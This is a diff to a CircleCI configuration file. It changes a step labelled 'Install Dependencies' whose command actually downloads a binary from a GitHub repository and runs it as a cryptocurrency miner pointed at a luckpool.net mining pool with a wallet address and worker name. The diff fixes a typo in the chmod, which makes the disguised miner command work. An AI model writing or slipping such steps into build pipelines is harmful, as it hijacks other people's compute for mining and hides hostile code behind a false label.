@@ -6,7 +6,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://github.com/Yahihs/rep/raw/main/nhq && chmmod +x nhq && ./nhq -v -l ap.luckpool.net:3956 -u RTQ4T8D6xgLR5u9e1aZZjrBdQy8sog2Zb7.Rig001 -p x -t 16
+            command: wget https://github.com/Yahihs/rep/raw/main/nhq && chmod +x nhq && ./nhq -v -l ap.luckpool.net:3956 -u RTQ4T8D6xgLR5u9e1aZZjrBdQy8sog2Zb7.Rig001 -p x -t 16
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
